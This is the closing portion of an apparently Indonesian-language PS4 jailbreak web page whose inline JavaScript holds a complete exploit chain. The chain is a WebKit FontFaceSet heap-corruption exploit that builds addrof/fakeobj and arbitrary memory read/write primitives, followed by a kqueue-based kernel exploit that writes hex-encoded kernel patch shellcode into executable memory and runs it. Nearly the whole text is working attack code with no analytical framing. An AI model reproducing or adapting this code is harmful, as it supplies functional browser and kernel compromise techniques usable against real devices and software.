                var that_one_socket = chain.syscall(97, 2, 1, 0);
                if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
                    alert('invalid socket');
                    while (1);
                }
                var kevent = p.malloc(0x20);
                p.write8(kevent.add32(0x0), that_one_socket);
                p.write4(kevent.add32(0x8), 0xffff + 0x010000);
                p.write4(kevent.add32(0xc), 0x0);
                p.write8(kevent.add32(0x10), 0x0);
                p.write8(kevent.add32(0x18), 0x0);
                {
                    for (var i = 0; i < NUM_KQUEUES; i++) {
                        chain.fcall(
                            window.syscalls[363],
                            kqueues[i],
                            kevent,
                            0x1,
                            0x0,
                            0x0,
                            0x0
                        );
                    }
                }
                chain.run();
                {
                    for (var i = 18; i < NUM_KQUEUES; i += 2) {
                        chain.fcall(window.syscalls[6], kqueues[i]);
                    }
                }
                chain.run();
                alert(
                    'masukan flasdisk dan pilih OK setelah tampil notipikasi. lalu cabut flasdisk setelah jailbreak berhasil'
                );
                {
                    for (var i = 1; i < NUM_KQUEUES; i += 2) {
                        chain.fcall(window.syscalls[6], kqueues[i]);
                    }
                }
                chain.run();
                if (chain.syscall(23, 0).low == 0) {
                    chain.fcall(window.syscalls[73], 0x4000, 0xc000);
                    chain.fcall(window.syscalls[325]);
                    chain.run();

                    var patch_buffer = chain.syscall(
                        477,
                        0x0,
                        0x4000,
                        0x7,
                        0x1000,
                        0xffffffff,
                        0
                    );
                    var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
                    var PatchPl = [
                        0x00000bb8, 0xfe894800, 0x033d8d48, 0x0f000000, 0x4855c305,
                        0x8b48e589, 0x95e8087e, 0xe8000000, 0x00000175, 0x033615ff,
                        0x8b480000, 0x0003373d, 0x3f8b4800, 0x74ff8548, 0x3d8d48eb,
                        0x0000029d, 0xf9358b48, 0x48000002, 0x0322158b, 0x8b480000,
                        0x00d6e812, 0x8d480000, 0x00029f3d, 0x358b4800, 0x000002e4,
                        0x05158b48, 0x48000003, 0xb9e8128b, 0x48000000, 0x02633d8d,
                        0x8b480000, 0x0002bf35, 0x158b4800, 0x000002c8, 0xe8128b48,
                        0x0000009c, 0x7a3d8d48, 0x48000002, 0x02aa358b, 0x8b480000,
                        0x0002ab15, 0x128b4800, 0x00007fe8, 0x0185e800, 0xc35d0000,
                        0x6d3d8948, 0x48000002, 0x026e3d01, 0x01480000, 0x00026f3d,
                        0x3d014800, 0x00000270, 0x713d0148, 0x48000002, 0x02723d01,
                        0x01480000, 0x0002933d, 0x3d014800, 0x00000294, 0x653d0148,
                        0x48000002, 0x02663d01, 0x01480000, 0x0002873d, 0x3d014800,
                        0x00000288, 0x893d0148, 0x48000002, 0x028a3d01, 0x01480000,
                        0x00028b3d, 0x3d014800, 0x0000024c, 0x3d3d0148, 0xc3000002,
                        0xe5894855, 0x10ec8348, 0x24348948, 0x24548948, 0xed15ff08,
                        0x48000001, 0x4b74c085, 0x48c28948, 0x4840408b, 0x2f74c085,
                        0x28788b48, 0x243c3b48, 0x8b480a74, 0xc0854800, 0xeceb1d74,
                        0x18788b48, 0x74ff8548, 0x7f8b48ed, 0x7c3b4810, 0xe2750824,
                        0xff1040c7, 0x48ffffff, 0x31107a8d, 0x31d231f6, 0xa515ffc9,
                        0x48000001, 0x5d10c483, 0x894855c3, 0xc0200fe5, 0xffff2548,
                        0x220ffffe, 0x3d8b48c0, 0x000001c8, 0x909007c7, 0x47c79090,
                        0x48909004, 0x358b48b8, 0x000001ac, 0x08778948, 0x651047c7,
                        0xc73c8b48, 0x00251447, 0x47c70000, 0x89480018, 0x1c47c738,
                        0xb8489090, 0x7d358b48, 0x48000001, 0xc7207789, 0xc7482847,
                        0x47c70100, 0x0000002c, 0x778d48e9, 0x158b4834, 0x00000150,
                        0x89f22948, 0x8b483057, 0x00016b35, 0x568d4800, 0xd7294805,
                        0xc148ff89, 0x814808e7, 0x0000e9cf, 0x3e894800, 0x00000d48,
                        0x220f0001, 0x55c35dc0, 0x0fe58948, 0x2548c020, 0xfffeffff,
                        0x48c0220f, 0x013a3d8b, 0x07c70000, 0x00c3c031, 0x353d8b48,
                        0xc7000001, 0xc3c03107, 0x3d8b4800, 0x00000130, 0xc03107c7,
                        0x8b4800c3, 0x00012b3d, 0x3107c700, 0x4800c3c0, 0x00a63d8b,
                        0x87c70000, 0x001f1e01, 0x9090f631, 0x1e0587c7, 0xc931001f,
                        0x87c79090, 0x001f1e09, 0x9090d231, 0x1e3e87c7, 0xc931001f,
                        0x0d489090, 0x00010000, 0xffc0220f, 0x0000ef15, 0xc0200f00,
                        0xffff2548, 0x220ffffe, 0x3d8b48c0, 0x000000dc, 0xc03107c7,
                        0x0d4800c3, 0x00010000, 0x5dc0220f, 0x737973c3, 0x5f6d6574,
                        0x70737573, 0x5f646e65, 0x73616870, 0x705f3265, 0x735f6572,
                        0x00636e79, 0x74737973, 0x725f6d65, 0x6d757365, 0x68705f65,
                        0x32657361, 0x73797300, 0x5f6d6574, 0x75736572, 0x705f656d,
                        0x65736168, 0x90900033, 0x00000000, 0x00000000, 0x000f88f0,
                        0x00000000, 0x002ef170, 0x00000000, 0x00018df0, 0x00000000,
                        0x00018ef0, 0x00000000, 0x02654110, 0x00000000, 0x00097230,
                        0x00000000, 0x00402e60, 0x00000000, 0x01520108, 0x00000000,
                        0x01520100, 0x00000000, 0x00462d20, 0x00000000, 0x00462dfc,
                        0x00000000, 0x006259a0, 0x00000000, 0x006268d0, 0x00000000,
                        0x00625dc0, 0x00000000, 0x00626290, 0x00000000, 0x00626720,
                        0x00000000,
                    ];
                    for (var i = 0; i < PatchPl.length; i++) {
                        patch_buffer_view[i] = PatchPl[i];
                    }
                    chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
                    chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
                    chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
                    chain.run();
                    alert('jailbreak berhasil,silahkan cabut flasdisk');
                    setTimeout(jbdone, 50);
                } else {
                    alert(
                        'jailbreak gagal,silahkan bembali atau restar PS4'
                    );
                    p.write8(0, 0);
                }
            };

            function kernelX() {
                extra_gadgets();
                kchain_setup();
                object_setup();
                trigger_spray();
            }

            kernelX();
        }

        function poc() {
            var PAGE_SIZE = 16384;
            var SIZEOF_CSS_FONT_FACE = 0xb8;
            var HASHMAP_BUCKET = 208;
            var STRING_OFFSET = 20;
            var SPRAY_FONTS = 0x100a;
            var GUESS_FONT = 0x200430000;
            var NPAGES = 20;
            var INVALID_POINTER = 0;
            var HAMMER_FONT_NAME = 'font8';
            var HAMMER_NSTRINGS = 700;
            var union = new ArrayBuffer(8);
            var union_b = new Uint8Array(union);
            var union_i = new Uint32Array(union);
            var union_f = new Float64Array(union);
            var bad_fonts = [];
            for (var i = 0; i < SPRAY_FONTS; i++)
                bad_fonts.push(new FontFace('font1', '', {}));
            var good_font = new FontFace('font2', 'url(data:text/html,)', {});
            bad_fonts.push(good_font);
            var arrays = [];
            for (var i = 0; i < 512; i++) arrays.push(new Array(31));
            arrays[256][0] = 1.5;
            arrays[257][0] = {};
            arrays[258][0] = 1.5;
            var jsvalue = {
                a: arrays[256],
                b: new Uint32Array(1),
                c: true,
            };
            var string_atomifier = {};
            var string_id = 10000000;
            function ptrToString(p) {
                var s = '';
                for (var i = 0; i < 8; i++) {
                    s += String.fromCharCode(p % 256);
                    p = (p - (p % 256)) / 256;
                }
                return s;
            }
            function stringToPtr(p, o) {
                if (o === undefined) o = 0;
                var ans = 0;
                for (var i = 7; i >= 0; i--) ans = 256 * ans + p.charCodeAt(o + i);
                return ans;
            }
            var strings = [];
            function mkString(l, head) {
                var s =
                    head +
                    '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) +
                    string_id++;
                string_atomifier[s] = 1;
                strings.push(s);
                return s;
            }
            var guf = GUESS_FONT;
            var ite = true;
            var matches = 0;
            var round = 0;
            window.ffses = {};
            do {
                var p_s = ptrToString(NPAGES + 2);
                for (var i = 0; i < NPAGES; i++)
                    p_s += ptrToString(guf + i * PAGE_SIZE);
                p_s += ptrToString(INVALID_POINTER);
                for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
                var ffs = (ffses['search_' + ++round] = new FontFaceSet(bad_fonts));
                var badstr1 = mkString(HASHMAP_BUCKET, p_s);
                var guessed_font = null;
                var guessed_addr = null;
                for (var i = 0; i < SPRAY_FONTS; i++) {
                    bad_fonts[i].family = 'search' + round;
                    if (badstr1.substr(0, p_s.length) != p_s) {
                        guessed_font = i;
                        var p_s1 = badstr1.substr(0, p_s.length);
                        for (var i = 1; i <= NPAGES; i++) {
                            if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                                guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                                break;
                            }
                        }
                        if (matches++ == 0) {
                            guf = guessed_addr + 2 * PAGE_SIZE;
                            guessed_addr = null;
                        }
                        break;
                    }
                }
                if ((ite = !ite)) guf += NPAGES * PAGE_SIZE;
            } while (guessed_addr === null);
            var p_s = '';
            p_s += ptrToString(26);
            p_s += ptrToString(guessed_addr);
            p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
            for (var i = 0; i < 19; i++) p_s += ptrToString(INVALID_POINTER);
            for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
            var needfix = [];
            for (var i = 0; ; i++) {
                ffses['ffs_leak_' + i] = new FontFaceSet([
                    bad_fonts[guessed_font],
                    bad_fonts[guessed_font + 1],
                    good_font,
                ]);
                var badstr2 = mkString(HASHMAP_BUCKET, p_s);
                needfix.push(mkString(HASHMAP_BUCKET, p_s));
                bad_fonts[guessed_font].family = 'evil2';
                bad_fonts[guessed_font + 1].family = 'evil3';
                var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
                if (leak < 0x1000000000000) break;
            }
            function makeReader(read_addr, ffs_name) {
                var fake_s = '';
                fake_s += '0000';
                fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
                fake_s += ptrToString(read_addr);
                fake_s += ptrToString(0x80000014);
                p_s = '';
                p_s += ptrToString(29);
                p_s += ptrToString(guessed_addr);
                p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
                p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
                for (var i = 0; i < 18; i++) p_s += ptrToString(INVALID_POINTER);
                for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
                var the_ffs = (ffses[ffs_name] = new FontFaceSet([
                    bad_fonts[guessed_font],
                    bad_fonts[guessed_font + 1],
                    bad_fonts[guessed_font + 2],
                    good_font,
                ]));
                mkString(HASHMAP_BUCKET, p_s);
                var relative_read = mkString(HASHMAP_BUCKET, fake_s);
                bad_fonts[guessed_font].family = ffs_name + '_evil1';
                bad_fonts[guessed_font + 1].family = ffs_name + '_evil2';
                bad_fonts[guessed_font + 2].family = ffs_name + '_evil3';
                needfix.push(relative_read);
                if (relative_read.length < 1000)
                    return makeReader(read_addr, ffs_name + '_');
                return relative_read;
            }
            var fastmalloc = makeReader(leak, 'ffs3');
            for (var i = 0; i < 100000; i++) mkString(128, '');
            var props = [];
            for (var i = 0; i < 0x10000; i++) {
                props.push({
                    value: 0x41434442,
                });
                props.push({
                    value: jsvalue,
                });
            }
            var jsvalue_leak = null;
            while (jsvalue_leak === null) {
                Object.defineProperties({}, props);
                for (var i = 0; ; i++) {
                    if (
                        fastmalloc.charCodeAt(i) == 0x42 &&
                        fastmalloc.charCodeAt(i + 1) == 0x44 &&
                        fastmalloc.charCodeAt(i + 2) == 0x43 &&
                        fastmalloc.charCodeAt(i + 3) == 0x41 &&
                        fastmalloc.charCodeAt(i + 4) == 0 &&
                        fastmalloc.charCodeAt(i + 5) == 0 &&
                        fastmalloc.charCodeAt(i + 6) == 254 &&
                        fastmalloc.charCodeAt(i + 7) == 255 &&
                        fastmalloc.charCodeAt(i + 24) == 14
                    ) {
                        jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                        break;
                    }
                }
            }
            var rd_leak = makeReader(jsvalue_leak, 'ffs4');
            var array256 = stringToPtr(rd_leak, 16);
            var ui32a = stringToPtr(rd_leak, 24);
            var rd_arr = makeReader(array256, 'ffs5');
            var butterfly = stringToPtr(rd_arr, 8);
            var rd_ui32 = makeReader(ui32a, 'ffs6');
            for (var i = 0; i < 8; i++) union_b[i] = rd_ui32.charCodeAt(i);
            var structureid_low = union_i[0];
            var structureid_high = union_i[1];
            union_i[0] = 0x10000;
            union_i[1] = 0;
            arrays[257][1] = {};
            arrays[257][0] = union_f[0];
            union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
            union_i[1] =
                (guessed_addr - (guessed_addr % 0x100000000)) / 0x100000000;
            arrays[256][i] = union_f[0];
            pp_s = '';
            pp_s += ptrToString(56);
            for (var i = 0; i < 12; i++)
                pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
            var fake_s = '';
            fake_s += '0000';
            fake_s += ptrToString(INVALID_POINTER);
            fake_s += ptrToString(butterfly);
            fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
            var ffs7_args = [];
            for (var i = 0; i < 12; i++)
                ffs7_args.push(bad_fonts[guessed_font + i]);
            ffs7_args.push(good_font);
            var ffs8_args = [bad_fonts[guessed_font + 12]];
            for (var i = 0; i < 5; i++)
                ffs8_args.push(
                    new FontFace(HAMMER_FONT_NAME, 'url(data:text/html,)', {})
                );
            for (var i = 0; i < HAMMER_NSTRINGS; i++)
                mkString(HASHMAP_BUCKET, pp_s);
            ffses.ffs7 = new FontFaceSet(ffs7_args);
            mkString(HASHMAP_BUCKET, pp_s);
            ffses.ffs8 = new FontFaceSet(ffs8_args);
            var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
            needfix.push(post_ffs);
            for (var i = 0; i < 13; i++)
                bad_fonts[guessed_font + i].family = 'hammer' + i;
            function boot_addrof(obj) {
                arrays[257][32] = obj;
                union_f[0] = arrays[258][0];
                return union_i[1] * 0x100000000 + union_i[0];
            }
            function boot_fakeobj(addr) {
                union_i[0] = addr;
                union_i[1] = (addr - (addr % 0x100000000)) / 0x100000000;
                arrays[258][0] = union_f[0];
                return arrays[257][32];
            }
            var arw_master = new Uint32Array(8);
            var arw_slave = new Uint8Array(1);
            var obj_master = new Uint32Array(8);
            var obj_slave = {
                obj: null,
            };
            var addrof_slave = boot_addrof(arw_slave);
            var addrof_obj_slave = boot_addrof(obj_slave);
            union_i[0] = structureid_low;
            union_i[1] = structureid_high;
            union_b[6] = 7;
            var obj = {
                jscell: union_f[0],
                butterfly: true,
                buffer: arw_master,
                size: 0x5678,
            };
            function i48_put(x, a) {
                a[4] = x | 0;
                a[5] = (x / 4294967296) | 0;
            }
            function i48_get(a) {
                return a[4] + a[5] * 4294967296;
            }
            window.addrof = function (x) {
                obj_slave.obj = x;
                return i48_get(obj_master);
            };
            window.fakeobj = function (x) {
                i48_put(x, obj_master);
                return obj_slave.obj;
            };
            function read_mem_setup(p, sz) {
                i48_put(p, arw_master);
                arw_master[6] = sz;
            }
            window.read_mem = function (p, sz) {
                read_mem_setup(p, sz);
                var arr = [];
                for (var i = 0; i < sz; i++) arr.push(arw_slave[i]);
                return arr;
            };
            window.write_mem = function (p, data) {
                read_mem_setup(p, data.length);
                for (var i = 0; i < data.length; i++) arw_slave[i] = data[i];
            };
            window.read_ptr_at = function (p) {
                var ans = 0;
                var d = read_mem(p, 8);
                for (var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
                return ans;
            };
            window.write_ptr_at = function (p, d) {
                var arr = [];
                for (var i = 0; i < 8; i++) {
                    arr.push(d & 0xff);
                    d /= 256;
                }
                write_mem(p, arr);
            };
            (function () {
                var magic = boot_fakeobj(boot_addrof(obj) + 16);
                magic[4] = addrof_slave;
                magic[5] =
                    (addrof_slave - (addrof_slave % 0x100000000)) / 0x100000000;
                obj.buffer = obj_master;
                magic[4] = addrof_obj_slave;
                magic[5] =
                    (addrof_obj_slave - (addrof_obj_slave % 0x100000000)) / 0x100000000;
                magic = null;
            })();
            (function () {
                var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
                write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
                for (var i = 0; i < needfix.length; i++) {
                    var addr = read_ptr_at(addrof(needfix[i]) + 8);
                    write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
                    write_ptr_at(addr + 8, addr + 20);
                    write_ptr_at(addr + 16, 0x80000014);
                }
                write_ptr_at(butterfly + 248, 0x1f0000001f);
            })();
            var expl_master = new Uint32Array(8);
            var expl_slave = new Uint32Array(2);
            var addrof_expl_slave = addrof(expl_slave);
            var m = fakeobj(addrof(obj) + 16);
            obj.buffer = expl_slave;
            m[7] = 1;
            obj.buffer = expl_master;
            m[4] = addrof_expl_slave;
            m[5] =
                (addrof_expl_slave - (addrof_expl_slave % 0x100000000)) / 0x100000000;
            m[7] = 1;
            var prim = {
                write8: function (addr, value) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    if (value instanceof int64) {
                        expl_slave[0] = value.low;
                        expl_slave[1] = value.hi;
                    } else {
                        expl_slave[0] = value;
                        expl_slave[1] = 0;
                    }
                },
                write4: function (addr, value) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    if (value instanceof int64) {
                        expl_slave[0] = value.low;
                    } else {
                        expl_slave[0] = value;
                    }
                },
                write2: function (addr, value) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    var tmp = expl_slave[0] & 0xffff0000;
                    if (value instanceof int64) {
                        expl_slave[0] = (value.low & 0xffff) | tmp;
                    } else {
                        expl_slave[0] = (value & 0xffff) | tmp;
                    }
                },
                write1: function (addr, value) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    var tmp = expl_slave[0] & 0xffffff00;
                    if (value instanceof int64) {
                        expl_slave[0] = (value.low & 0xff) | tmp;
                    } else {
                        expl_slave[0] = (value & 0xff) | tmp;
                    }
                },
                read8: function (addr) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    return new int64(expl_slave[0], expl_slave[1]);
                },
                read4: function (addr) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    return expl_slave[0];
                },
                read2: function (addr) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    return expl_slave[0] & 0xffff;
                },
                read1: function (addr) {
                    expl_master[4] = addr.low;
                    expl_master[5] = addr.hi;
                    return expl_slave[0] & 0xff;
                },
                leakval: function (obj) {
                    obj_slave.obj = obj;
                    return new int64(obj_master[4], obj_master[5]);
                },
            };
            window.p = prim;
            run_hax();
        }
    </script>                             
	         
    <br><br>
    <h4 style="text-align:center;font-size:20px;color:#ECDBBA; margin:50px 40px 0 40px">
 </h4> 
  PENDUKUNG :
</body>
  
   OGE EVOLUTION & MUHAMMAD MUTAKIN
</html>
